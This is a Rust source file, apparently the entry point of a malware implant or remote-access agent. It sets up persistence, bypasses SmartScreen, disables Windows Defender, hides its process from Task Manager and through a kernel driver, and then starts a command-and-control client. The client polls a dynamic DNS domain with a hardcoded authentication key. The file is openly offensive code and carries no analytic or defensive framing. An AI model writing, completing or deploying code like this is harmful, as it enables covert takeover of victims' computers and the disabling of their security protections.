// main_program.rs — Rust port of Main Program.cs
// Agent entry point: sets up persistence, stealth, and starts the C2 client.

use log::info;
use crate::registry::Startup;
use crate::kernel_driver::KernelDriver;
use crate::c2_client::C2Client;

/// Agent entry point — called from main() or as the agent binary.
pub async fn run() {
    // Step 1: Persistence
    Startup::persist();
    Startup::bypass_smart_screen();
    Startup::rename_process();
    Startup::disable_windows_defender();
    Startup::hide_process_from_task_manager();

    // Step 2: Kernel-level stealth (if driver is loaded)
    if KernelDriver::try_hide_self() {
        info!("[+] Process hidden via kernel driver");
    }

    // Step 3: Initialize C2 client with dynamic DNS
    let c2 = C2Client::new(
        "end.myftp.org",       // server domain (NoIP DDNS)
        "c2_auth_r3ih0_2024",  // auth key (must match server --key)
        443,                   // port
        5000,                  // poll interval ms
        5,                     // max consecutive failures
        30000,                 // heartbeat interval ms
        10000,                 // connection timeout ms
    );

    // Step 4: Set up signal handlers for clean shutdown
    let c2_for_shutdown = std::sync::Arc::new(c2);

    // Ctrl+C handler
    {
        let c2_ref = c2_for_shutdown.clone();
        ctrlc_handler(move || {
            c2_ref.stop();
            KernelDriver::try_unhide();
            KernelDriver::close();
        });
    }

    // Start polling
    c2_for_shutdown.start();

    // Keep main alive while agent is running
    while c2_for_shutdown.is_running() {
        tokio::time::sleep(std::time::Duration::from_secs(1)).await;
    }
}

fn ctrlc_handler<F: FnOnce() + Send + 'static>(handler: F) {
    let handler = std::sync::Mutex::new(Some(handler));
    let _ = ctrlc::set_handler(move || {
        if let Some(h) = handler.lock().unwrap().take() {
            h();
        }
        std::process::exit(0);
    });
}
